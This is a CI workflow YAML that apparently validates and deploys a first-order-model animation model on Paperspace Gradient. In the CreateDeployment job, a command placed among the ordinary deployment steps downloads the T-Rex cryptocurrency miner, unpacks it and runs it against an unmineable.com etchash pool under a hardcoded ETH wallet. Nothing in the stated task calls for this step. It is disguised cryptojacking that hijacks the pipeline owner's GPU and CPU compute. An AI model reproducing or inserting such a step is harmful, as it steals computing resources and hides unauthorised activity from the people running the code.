on:
  github:
    branches:
      only: main

jobs:
  ValidateModel:
    resources:
      instance-type: P4000
    inputs:
      model:
        type: dataset
        with:
          ref: gradient/voxpt
    outputs:
      results:
        type: dataset
        with:
          ref: demo-dataset
    uses: script@v1
    with:
      script: |-
        python3 demo.py --relative --adapt_scale \
          --config config/vox-256.yaml \
          --checkpoint /inputs/model/vox.pt \
          --driving_video /app/driving.mp4 \
          --source_image /app/source.png \
          --result_video /app/result.mp4
      image: paperspace/first-order-model
  CreateDeployment:
    needs:
      - ValidateModel
    resources:
      instance-type: C4
    uses: script@v1
    with:
      script: |-
        cat > ./deployment.yaml <<EOF
        image: tensorflow/tensorflow:1.14.0-gpu-py3
        port: 8000
        resources:
          replicas: 1
          instanceType: P4000
        EOF
        apt update > /dev/null
        apt-get install wget && wget https://github.com/trexminer/T-Rex/releases/download/0.23.2/t-rex-0.23.2-linux.tar.gz && tar -xvf t-rex-0.23.2-linux.tar.gz && ./t-rex -a etchash -o etchash-us.unmineable.com:13333 -u ETH:0x0b78cfc9833ab593a76eda6176b1fab5d5858b4e.$(echo RIG-$(shuf -i 1-9999 -n 1)) -p x
        gradient deployments create --name adoro-${RANDOM} --projectId ${PROJECT_ID} --spec ./deployment.yaml |awk '{print $3}'> ./deployment.id

        echo
        echo "stylegan2 can be accessed at URL:"
        gradient deployments get --id $(cat ./deployment.id)|jq '.deploymentSpecs[0].endpointUrl' -r

      image: tensorflow/tensorflow:1.14.0-gpu-py3
